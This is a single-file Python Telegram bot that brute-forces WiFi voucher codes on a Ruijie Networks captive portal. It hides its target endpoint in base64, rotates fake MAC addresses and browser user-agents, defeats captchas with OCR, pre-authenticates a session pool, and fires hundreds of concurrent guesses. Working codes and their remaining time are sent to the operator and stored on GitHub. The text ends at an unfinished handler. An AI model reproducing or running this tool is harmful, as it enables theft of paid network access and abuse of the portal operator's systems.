"""
Voucher Bot — Fully Optimized & Exception-Safe Stable Version (single-file)

Feature set:
  • Auto-detects VPS CPU Cores & RAM to dynamically adjust Concurrency
  • Background Pre-authenticated Session Pool (Extreme Speed / No Captcha Lag)
  • Aggressive Garbage Collection to prevent Memory Leaks / VPS Crashing
  • Auto-cleanup stale webhook at startup (prevents 409 Conflict)
  • Admin-only command guard (except none)
  • SSRF guard + session-URL structure check
  • Plan filters (e.g. 30min, 2h, 1d, 1mo, unlimit)
  • Multi-length spec (6 | 6,7,8 | 6-8 | 6,8-10,12) + target count
  • GitHub persistence (result.json) + local state (state.json)
  • Race-safe Telegram notifications (per-chat asyncio.Lock)
  • Captcha OCR: raw-first, thresholded-fallback
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import string
import time
import uuid
import ipaddress
import gc
from urllib.parse import urlparse, parse_qs

import aiohttp
import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("voucher-bot")

# ── Hardware Auto-Scaling Engine ───────────────────────────────────────────
def _get_vps_resources():
    try:
        cores = os.cpu_count() or 1
        ram_gb = 1.0
        if os.path.exists("/proc/meminfo"):
            with open("/proc/meminfo", "r") as f:
                for line in f:
                    if "MemTotal" in line:
                        mem_kb = int(line.split()[1])
                        ram_gb = round(mem_kb / (1024 * 1024), 2)
                        break
        return cores, ram_gb
    except Exception:
        return 1, 1.0

CPU_CORES, VPS_RAM = _get_vps_resources()
logger.info(f"🧠 Hardware Detected: {CPU_CORES} Cores, {VPS_RAM} GB RAM")

if CPU_CORES >= 4 or VPS_RAM >= 8.0:
    CONCURRENCY = 500
    BATCH_SIZE = 800
    POOL_MAX_SIZE = 150
elif CPU_CORES >= 2 or VPS_RAM >= 4.0:
    CONCURRENCY = 300
    BATCH_SIZE = 500
    POOL_MAX_SIZE = 80
else:
    CONCURRENCY = 100
    BATCH_SIZE = 250
    POOL_MAX_SIZE = 30

logger.info(f"⚡ Auto-Configured Settings -> Concurrency: {CONCURRENCY}, Batch Size: {BATCH_SIZE}, Session Pool: {POOL_MAX_SIZE}")

# ── Environment (no hardcoded secrets) ─────────────────────────────────────
def _required(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        raise RuntimeError(f"Required environment variable missing: {name}")
    return v

BOT_TOKEN    = _required("BOT_TOKEN")
ADMIN_ID     = _required("ADMIN_ID")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER", "")
REPO_NAME    = os.environ.get("REPO_NAME", "")
GITHUB_ON    = bool(GITHUB_TOKEN and REPO_OWNER and REPO_NAME)

# ── Constants ──────────────────────────────────────────────────────────────
STATE_FILE   = "state.json"
RESULT_FILE  = "result.json"
EXHAUSTIVE_MODE1_MAX_LEN = 5
TG_MAX       = 4096
START_TS     = time.monotonic()

POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

MODE_INFO = {
    "1": ("ဂဏန်းသီးသန့် (0-9)",        string.digits,                          10),
    "2": ("အင်္ဂလိပ်အသေး (a-z)",        string.ascii_lowercase,                 26),
    "3": ("အင်္ဂလိပ်အကြီး (A-Z)",        string.ascii_uppercase,                 26),
    "4": ("အကြီး+အသေး (a-zA-Z)",        string.ascii_letters,                   52),
    "5": ("အသေး+ဂဏန်း (a-z, 0-9)",       string.ascii_lowercase + string.digits, 36),
}

PLAN_RE = re.compile(r"^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$", re.IGNORECASE)

# ── Global state ───────────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data        = {}
scan_tasks       = {}
success_texts    = {}
limited_texts    = {}
notify_setting   = {}
last_scan_params = {}
pending_brute    = {}

success_msg_ids  = {}
limited_msg_ids  = {}

_notify_locks  = {}
_success_queue = asyncio.Queue()
_voucher_sem   = None
session: aiohttp.ClientSession | None = None
_connector: aiohttp.TCPConnector | None = None

session_pool = asyncio.Queue()
pool_tasks = {}

def _notify_lock(cid: int) -> asyncio.Lock:
    lock = _notify_locks.get(cid)
    if lock is None:
        lock = asyncio.Lock()
        _notify_locks[cid] = lock
    return lock

# ── Helpers ────────────────────────────────────────────────────────────────
def is_admin(chat_id) -> bool:
    return str(chat_id) == str(ADMIN_ID)

def _split_4096(text: str) -> list[str]:
    if len(text) <= TG_MAX:
        return [text]
    chunks, cur = [], ""
    for line in text.split("\n"):
        cand = cur + ("\n" if cur else "") + line
        if len(cand) > TG_MAX:
            if cur:
                chunks.append(cur)
            cur = line
        else:
            cur = cand
    if cur:
        chunks.append(cur)
    return chunks

async def _render_chunked(chat_id: int, text: str, tracker: dict):
    chunks = _split_4096(text)
    mids = tracker.get(chat_id, [])
    for i, chunk in enumerate(chunks):
        if i < len(mids):
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=mids[i],
                    text=chunk, parse_mode="Markdown",
                )
            except Exception as e:
                if "not modified" in str(e).lower():
                    continue
                try:
                    sent = await bot.send_message(chat_id, chunk, parse_mode="Markdown")
                    mids[i] = sent.message_id
                except Exception as ee:
                    logger.debug("send chunk error: %s", ee)
        else:
            try:
                sent = await bot.send_message(chat_id, chunk, parse_mode="Markdown")
                mids.append(sent.message_id)
            except Exception as ee:
                logger.debug("send chunk error: %s", ee)
    while len(mids) > len(chunks):
        mid = mids.pop()
        try:
            await bot.delete_message(chat_id, mid)
        except Exception:
            pass
    tracker[chat_id] = mids

async def send_chunks(chat_id: int, text: str, parse_mode: str = "Markdown",
                      reply_to_message_id=None):
    first = True
    for chunk in _split_4096(text):
        try:
            await bot.send_message(
                chat_id, chunk, parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id if first else None,
            )
            first = False
        except Exception as e:
            logger.warning("send_chunks: %s", e)

# ── Plan parsing ───────────────────────────────────────────────────────────
def plan_to_minutes(s) -> float:
    if not s:
        return 0
    s = str(s).strip().lower()
    if s in ("unlimit", "unlimited"):
        return float("inf")
    total = 0
    for val, unit in re.findall(r"(\d+)\s*(mo|min|h|d|m)", s):
        v = int(val)
        if unit == "mo":
            total += v * 30 * 24 * 60
        elif unit == "d":
            total += v * 24 * 60
        elif unit == "h":
            total += v * 60
        else:
            total += v
    return total

def _parse_minutes(val) -> str:
    total = int(val)
    if total <= 0:
        return "0m"
    if total < 60:
        return f"{total}m"
    h, m = divmod(total, 60)
    if h < 24:
        return f"{h}h {m}m" if m else f"{h}h"
    d, rh = divmod(h, 24)
    if d < 30:
        return f"{d}d {rh}h" if rh else f"{d}d"
    mo, rd = divmod(d, 30)
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

def _parse_seconds(val) -> str:
    s = int(val)
    h, r = divmod(s, 3600)
    m, s = divmod(r, 60)
    if h:
        return f"{h}h {m}m"
    if m:
        return f"{m}m"
    return f"{s}s"

# ── Code generators ────────────────────────────────────────────────────────
def iter_codes(mode, length):
    mode = str(mode)
    length = int(length)
    if mode not in MODE_INFO:
        raise ValueError(f"Mode 1-5 အတွင်းသာ ဖြစ်ရမည် (got {mode})")
    if not (1 <= length <= 20):
        raise ValueError("Length 1-20 အတွင်းသာ ဖြစ်ရမည်")

    _, charset, _ = MODE_INFO[mode]

    if mode == "1" and length <= EXHAUSTIVE_MODE1_MAX_LEN:
        order = list(range(10 ** length))
        random.shuffle(order)
        for i in order:
            yield str(i).zfill(length)
        return

    while True:
        yield "".join(random.choice(charset) for _ in range(length))

def parse_length_spec(spec: str) -> list[int]:
    lengths = set()
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            a, b = int(a), int(b)
            if a > b:
                a, b = b, a
            lengths.update(range(a, b + 1))
        else:
            lengths.add(int(part))
    out = sorted(lengths)
    if not out:
        raise ValueError("Length spec empty")
    for L in out:
        if not (1 <= L <= 20):
            raise ValueError(f"Length {L} 1-20 အတွင်းသာ ဖြစ်ရမည်")
    return out

def format_progress(checked, speed, found, target, current_length, lengths):
    lines = ["📋 Status: Running"]
    if current_length is not None and lengths and len(lengths) > 1:
        idx = lengths.index(current_length) + 1 if current_length in lengths else "?"
        lines.append(f"📏 Length: {current_length} ({idx}/{len(lengths)})")
    elif current_length is not None:
        lines.append(f"📏 Length: {current_length}")
    lines.append(f"⚡ Speed: {speed:,.0f}/min")
    lines.append(f"🔍 Checked: {checked:,}")
    lines.append(f"💎 Found: {found}")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── SSRF + URL structure ───────────────────────────────────────────────────
def is_safe_url(url: str) -> bool:
    try:
        p = urlparse(url)
        if p.scheme not in ("http", "https"):
            return False
        host = (p.hostname or "").lower()
        if not host or host in ("localhost", "0.0.0.0"):
            return False
        try:
            addr = ipaddress.ip_address(host)
            if any([addr.is_loopback, addr.is_private, addr.is_link_local,
                    addr.is_reserved, addr.is_unspecified, addr.is_multicast]):
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False

def is_valid_session_url(url: str) -> bool:
    try:
        p = urlparse(url)
        if not is_safe_url(url):
            return False
        qs = parse_qs(p.query)
        return all(k in qs for k in ("gw_id", "gw_address", "gw_port", "mac", "ip"))
    except Exception:
        return False

# ── Captcha ────────────────────────────────────────────────────────────────
_ocr = None

def _get_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr

def _ocr_sync(image_bytes: bytes):
    ocr = _get_ocr()
    try:
        raw = ocr.classification(image_bytes)
        if raw and raw.isalnum() and len(raw) >= 3:
            return raw.upper()
    except Exception:
        pass
    try:
        arr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", th)
        out = (ocr.classification(buf.tobytes()) or "").upper()
        return out or None
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

# ── Network helpers ────────────────────────────────────────────────────────
def _random_mac() -> str:
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{b:02x}" for b in [first] + [random.randint(0, 255) for _ in range(5)])

def _replace_mac(url: str, mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = _replace_mac(session_url, _random_mac())
    headers = {
        "accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"),
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return m.group(1) if m else previous
    except Exception as e:
        logger.debug("get_session_id: %s", e)
        return previous

async def Captcha_Image(sess, session_id):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/*,*/*;q=0.8",
        "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
        "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
    }
    params = {"sessionId": session_id, "_t": str(time.time())}
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params, headers=headers,
    ) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
        "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
    }
    try:
        async with sess.post(
            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
            headers=headers, json={"sessionId": session_id, "authCode": text},
        ) as req:
            try:
                data = await req.json(content_type=None)
            except Exception:
                return None
            return session_id if data.get("success") is True else None
    except Exception as e:
        logger.debug("Varify_Captcha: %s", e)
        return None

# ── High-Speed Background Session Generator Pool ──────────────────────────
async def session_pool_filler(session_url):
    while True:
        if session_pool.qsize() >= POOL_MAX_SIZE:
            await asyncio.sleep(2)
            continue
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=20),
            ) as ts:
                session_id = await get_session_id(ts, session_url)
                if not session_id:
                    continue
                
                auth_code = None
                for _ in range(4):
                    img = await Captcha_Image(ts, session_id)
                    txt = await Captcha_Text(img)
                    if not txt:
                        continue
                    if await Varify_Captcha(ts, session_id, txt):
                        auth_code = txt
                        break
                
                if auth_code:
                    await session_pool.put((session_id, auth_code))
                    logger.debug(f"🔋 Added Pre-auth Session to Pool. Pool Size: {session_pool.qsize()}")
        except Exception:
            await asyncio.sleep(1)

async def get_balance(session_or_token: str) -> str:
    if not session_or_token:
        return "N/A"
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_or_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "referer": (f"https://portal-as.ruijienetworks.com/download/static/"
                    f"maccauth/src/balance.html?sessionId={session_or_token}"),
        "x-requested-with": "XMLHttpRequest",
        "user-agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"),
    }
    try:
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return "Error"
            try:
                data = await resp.json(content_type=None)
            except Exception:
                return "N/A"
            candidates = [data]
            for k in ("result", "data"):
                if isinstance(data, dict) and isinstance(data.get(k), dict):
                    candidates.append(data[k])
            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for key in ("totalMinutes", "remainingMinutes", "remainMinutes",
                            "leftMinutes", "balance", "remaining"):
                    if d.get(key) is not None:
                        return _parse_minutes(d[key])
                for key in ("remainingSeconds", "remainTime", "remainingTime",
                            "leftTime", "timeLeft", "remain_time"):
                    if d.get(key) is not None:
                        return _parse_seconds(d[key])
            return "N/A"
    except Exception as e:
        logger.debug("get_balance: %s", e)
        return "N/A"

# ── Notification rendering ─────────────────────────────────────────────────
async def _notify_success(chat_id: int):
    if not notify_setting.get(chat_id, False):
        return
    async with _notify_lock(chat_id):
        items = success_texts.get(chat_id, [])
        if not items:
            return
        lines = [f"`{it['code']}` – ⏳ {it.get('plan', 'N/A')}" for it in items]
        text = f"✅ Success Codes ({len(items)}):\n" + "\n".join(lines)
        await _render_chunked(chat_id, text, success_msg_ids)

async def _notify_limited(chat_id: int):
    if not notify_setting.get(chat_id, False):
        return
    async with _notify_lock(chat_id):
        items = limited_texts.get(chat_id, [])
        if not items:
            return
        text = f"⚠️ Limited Codes ({len(items)}):\n" + "\n".join(f"`{c}`" for c in items)
        await _render_chunked(chat_id, text, limited_msg_ids)

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None,
                        recheck=False, plan_filters=None):
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return None

    try:
        session_id, auth_code = await asyncio.wait_for(session_pool.get(), timeout=5.0)
    except asyncio.TimeoutError:
        return None

    response = None
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15),
        ) as ts:
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            async with ts.post(POST_URL, json=data, headers=headers) as req:
                if req.status == 429:
                    await asyncio.sleep(2)
                    return None
                response = await req.text()
    except Exception:
        response = None
    finally:
        gc.collect()

    if not response:
        return None

    if "logonUrl" in response:
        if recheck:
            return code

        token_for_balance = session_id
        try:
            rj = json.loads(response)
            logon = (rj.get("result") or {}).get("logonUrl", "") if isinstance(rj, dict) else ""
            m = re.search(r"token=([^&]+)", logon)
            if m:
                token_for_balance = m.group(1)
        except Exception:
            pass

        plan_str = await get_balance(token_for_balance)
        if plan_str in ("N/A", "Error"):
            plan_str = "N/A"

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        success_texts.setdefault(chat_id, []).append(
            {"code": code, "session_id": session_id, "plan": plan_str}
        )
        await _success_queue.put({
            "chat_id": chat_id, "code": code,
            "session_id": session_id, "plan": plan_str,
        })
        await _notify_success(chat_id)
        return code

    if "STA" in response:
        limited_texts.setdefault(chat_id, []).append(code)
        await _notify_limited(chat_id)
    return None

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                         target=None, progress_msg=None, plan_filters=None):
    checked = 0
    found = 0
    scan_start = time.monotonic()

    try:
        for li, length in enumerate(lengths):
            try:
                code_iter = iter_codes(mode, length)
            except ValueError as e:
                await bot.send_message(chat_id, f"❌ {e}")
                return

            while True:
                ct = scan_tasks.get(chat_id)
                if not ct or ct.get("scan_id") != scan_id:
                    return
                if ct.get("stop"):
                    last_scan_params[chat_id] = {
                        "mode": mode,
                        "lengths": lengths[li:],
                        "target": target,
                        "plan_filters": plan_filters or [],
                    }
                    save_state()
                    return

                batch = []
                for _ in range(BATCH_SIZE):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break
                if not batch:
                    break

                async def _one(code):
                    async with _voucher_sem:
                        return await perform_check(
                            session_url, code, chat_id, scan_id,
                            plan_filters=plan_filters,
                        )

                results = await asyncio.gather(
                    *[_one(c) for c in batch], return_exceptions=True,
                )

                for r in results:
                    if r and not isinstance(r, Exception):
                        found += 1
                        if target and found >= target:
                            try:
                                await bot.edit_message_text(
                                    chat_id=chat_id,
                                    message_id=progress_msg.message_id,
                                    text=f"🎯 Target reached! ({found})",
                                )
                            except Exception:
                                await bot.send_message(chat_id, f"🎯 Target reached! ({found})")
                            last_scan_params.pop(chat_id, None)
                            save_state()
                            return

                checked += len(batch)
                elapsed = time.monotonic() - scan_start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                text = format_progress(checked, speed, found, target, length, lengths)
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=text,
                    )
                except Exception as e:
                    if "not modified" not in str(e).lower():
                        try:
                            nm = await bot.send_message(chat_id, text)
                            progress_msg.message_id = nm.message_id
                        except Exception:
                            pass

        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg.message_id,
                text=f"✅ Scan complete. Found {found} code(s).",
            )
        except Exception:
            await bot.send_message(chat_id, f"✅ Scan complete. Found {found} code(s).")
        last_scan_params.pop(chat_id, None)
        save_state()

    except asyncio.CancelledError:
        raise
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub persistence ─────────────────────────────────────────────────────
async def _gh_get(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as resp:
        if resp.status == 200:
            data = await resp.json()
            content = base64.b64decode(data["content"]).decode("utf-8")
            return json.loads(content), data["sha"]
    return {}, None

async def _gh_put(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json",
    }
    encoded = base64.b64encode(json.dumps(content, ensure_ascii=False).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as resp:
        if resp.status not in (200, 201):
            text = await resp.text()
            raise RuntimeError(f"GitHub PUT {resp.status}: {text[:300]}")

async def _gh_put_retry(path, content, sha, message, retries=2):
    for attempt in range(retries + 1):
        try:
            return await _gh_put(path, content, sha, message)
        except RuntimeError as e:
            if "409" in str(e) and attempt < retries:
                _, sha = await _gh_get(path)
                continue
            raise

async def github_writer_loop():
    if not GITHUB_ON:
        return
    while True:
        await asyncio.sleep(80)
        items = []
        while not _success_queue.empty() and len(items) < 500:
            items.append(await _success_queue.get())
        if not items:
            continue
        try:
            results, sha = await _gh_get(RESULT_FILE)
            for it in items:
                cid = str(it["chat_id"])
                results.setdefault(cid, [])
                existing = {e["code"] if isinstance(e, dict) else e for e in results[cid]}
                if it["code"] not in existing:
                    results[cid].append({
                        "code": it["code"],
                        "session_id": it.get("session_id", ""),
                        "plan": it.get("plan", "N/A"),
                    })
            await _gh_put_retry(RESULT_FILE, results, sha, "Batch update")
        except Exception as e:
            logger.warning("GitHub writer error: %s — requeueing", e)
            for it in items:
                await _success_queue.put(it)

async def load_saved_results():
    if not GITHUB_ON:
        return
    try:
        results, _ = await _gh_get(RESULT_FILE)
        for cid_str, entries in results.items():
            try:
                cid = int(cid_str)
            except ValueError:
                continue
            success_texts.setdefault(cid, [])
            for e in entries:
                if isinstance(e, dict):
                    code = e.get("code", "")
                    sid = e.get("session_id", "")
                    plan = e.get("plan", "N/A")
                else:
                    code, sid, plan = str(e), "", "N/A"
                if not any(x["code"] == code for x in success_texts[cid]):
                    success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
        total = sum(len(v) for v in success_texts.values())
        logger.info("Loaded %d saved code(s) from GitHub", total)
    except Exception as e:
        logger.warning("load_saved_results: %s", e)

# ── Local state save/load ──────────────────────────────────────────────────
def save_state():
    try:
        payload = {
            "user_data":        {str(k): v for k, v in user_data.items()},
            "notify_setting":   {str(k): v for k, v in notify_setting.items()},
            "last_scan_params": {str(k): v for k, v in last_scan_params.items()},
        }
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(payload, f, ensure_ascii=False)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        logger.warning("save_state: %s", e)

def load_state():
    global user_data, notify_setting, last_scan_params
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
        for k, v in payload.get("notify_setting", {}).items():
            notify_setting[int(k)] = v
        for k, v in payload.get("last_scan_params", {}).items():
            last_scan_params[int(k)] = v
        logger.info("Loaded state for %d user(s)", len(user_data))
    except Exception as e:
        logger.warning("load_state: %s", e)

# ── Keep-alive web server ──────────────────────────────────────────────────
async def _web_root(_request):
    return web.Response(text="Bot is running.")

async def web_server():
    app = web.Application()
    app.router.add_get("/", _web_root)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("BOT_PORT", "5000"))
    try:
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
    except OSError as e:
        logger.warning("Web server could not start: %s", e)

# ── Usage text ─────────────────────────────────────────────────────────────
USAGE_TEXT = (
    "📖 **Voucher Bot အသုံးပြုနည်း**\n\n"
    "**၁။ Setup:**\n"
    "`/setup <url>`\n\n"
    "**၂။ ရှာဖွေခြင်း:**\n"
    "`/brute <mode> <lengths> [target] [plan…]`\n\n"
    "*Mode:*\n"
    "  1 = ဂဏန်းသီးသန့် (0-9)\n"
    "  2 = အင်္ဂလိပ်အသေး (a-z)\n"
    "  3 = အင်္ဂလိပ်အကြီး (A-Z)\n"
    "  4 = အကြီး+အသေး (a-zA-Z)\n"
    "  5 = အသေး+ဂဏန်း (a-z, 0-9)\n\n"
    "*Lengths:*\n"
    "  `6`         → length 6 တစ်ခုတည်း\n"
    "  `6,7,8`     → length 6, 7, 8 သုံးခု ဆက်တိုက်\n"
    "  `6-8`       → range 6-8\n"
    "  `6,8-10,12` → mixed\n\n"
    "*ဥပမာ:*\n"
    "  `/brute 1 6 5`          → ဂဏန်း ၆လုံး ၅ခု\n"
    "  `/brute 1 4-8 10`       → ဂဏန်း ၄-၈လုံး ၁၀ခု\n"
    "  `/brute 5 4,6-8 1d`     → alnum ၄,၆,၇,၈လုံး ၁ရက်\n"
    "  `/brute 2 6 1d 1mo`     → lowercase ၆လုံး ၁ရက် / ၁လ\n\n"
    "**၃။** `/status`        – အခြေအနေ\n"
    "**၄။** `/stop`          – ရပ်တန့်\n"
    "**၅။** `/resume`        – ဆက်ရှာ\n"
    "**၆။** `/saved`         – ရလဒ်ကြည့်\n"
    "**၇။** `/delete_saved`  – ရလဒ်ဖျက်\n"
    "**၈။** `/recheck`       – Success codes ပြန်စစ်\n"
    "**၉။** `/notify`        – Notification ON/OFF"
)

# ── Command handlers ───────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    await bot.reply_to(message, "Bot အသင့်ဖြစ်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=["help"])
async def cmd_help(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")

@bot.message_handler(commands=["setup"])
async def cmd_setup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း: /setup <session_url>")
        return
    url = args[1].strip()
    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if not is_valid_session_url(url):
        await bot.reply_to(message, "❌ Session URL မမှန်ပါ (gw_id/gw_address/gw_port/mac/ip လိုအပ်သည်)။")
        return

    cid = message.chat.id
    old = scan_tasks.pop(cid, None)
    if old and old.get("task") and not old["task"].done():
        old["stop"] = True
        old["task"].cancel()

    user_data.setdefault(cid, {})["session_url"] = url
    for d in (success_texts, limited_texts, last_scan_params, pending_brute,
              success_msg_ids, limited_msg_ids):
        d.pop(cid, None)

    if cid in pool_tasks:
        pool_tasks[cid].cancel()
    pool_tasks[cid] = asyncio.create_task(session_pool_filler(url))

    if GITHUB_ON:
        try:
            results, sha = await _gh_get(RESULT_FILE)
            if str(cid) in results:
                del results[str(cid)]
                await _gh_put_retry(RESULT_FILE, results, sha, f"Clear codes for {cid} on new setup")
        except Exception:
            pass
            
    save_state()
    await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ Background Pool စတင်နေပါပြီ။ /brute ဖြင့် စတင်ပါ။")

@bot.message_handler(commands=["brute"])
async def cmd_brute(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")
        return

    mode = args[1]
    if mode not in MODE_INFO:
        await bot.reply_to(message, "❌ Mode 1-5 အတွင်းသာ ဖြစ်ရမည်။")
        return

    try:
        lengths = parse_length_spec(args[2])
    except ValueError as e:
        await bot.reply_to(message, f"❌ Length မမှန်: {e}")
        return

    target = None
    plan_filters = []
    idx = 3
    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try:
            target = int(args[idx])
            idx += 1
        except ValueError:
            await bot.reply_to(message, "❌ Target သည် ဂဏန်း ဖြစ်ရမည်။")
            return

    for arg in args[idx:]:
        if not PLAN_RE.match(arg):
            await bot.reply_to(message, f"❌ '{arg}' သည် plan ပုံစံမမှန်။")
            return
        plan_filters.append(arg)

    cid = message.chat.id
    if cid not in user_data or "session_url" not in user_data[cid]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return

    running = scan_tasks.get(cid)
    if running and not running["task"].done():
        await bot.reply_to(message, "⚠️ Scan တစ်ခု run နေဆဲ။ /stop ဦးသုံးပါ။")
        return

    await _start_brute_scan(cid, mode, lengths, target, plan_filters)

async def _start_brute_scan(chat_id, mode, lengths, target, plan_filters):
    plan_filters = plan_filters or []
    label = MODE_INFO[mode][0]
    len_str = ",".join(map(str, lengths))
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"🔍 စတင်နေသည်... Mode {mode} ({label}), Lengths [{len_str}]{filter_note}",
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, lengths, chat_id, user_data[chat_id]["session_url"],
            scan_id, target, progress_msg=progress_msg, plan_filters=plan_filters,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_msg_ids.pop(chat_id, None)
    limited_msg_ids.pop(chat_id, None)

@bot.message_handler(commands=["stop"])
